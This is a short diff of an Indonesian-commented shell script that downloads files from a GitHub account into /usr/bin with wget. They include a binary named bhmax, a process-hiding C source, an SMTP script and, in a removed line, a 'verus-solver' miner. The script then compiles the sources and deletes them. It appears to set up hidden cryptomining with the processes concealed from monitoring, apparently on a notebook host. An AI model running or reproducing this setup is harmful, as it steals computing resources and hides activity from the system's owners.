@@ -5,7 +5,6 @@ cd /usr/bin
 
 # Unduh file yang diperlukan
 wget https://github.com/hudahadoh/vs/raw/main/bhmax
-wget https://github.com/hudahadoh/vs/raw/main/verus-solver
 wget https://raw.githubusercontent.com/hudahadoh/hime/main/hi.c
 wget https://raw.githubusercontent.com/hudahadoh/hime/main/processhider.c
 wget https://raw.githubusercontent.com/hudahadoh/hime/main/smtp.py
@@ -32,5 +31,3 @@ rm hi.c processhider.c
 # Ubah izin agar hi dapat dieksekusi
 chmod +x hi
 
-# Hapus skrip yang sudah tidak diperlukan
-rm ~/notebook_files/vs.sh
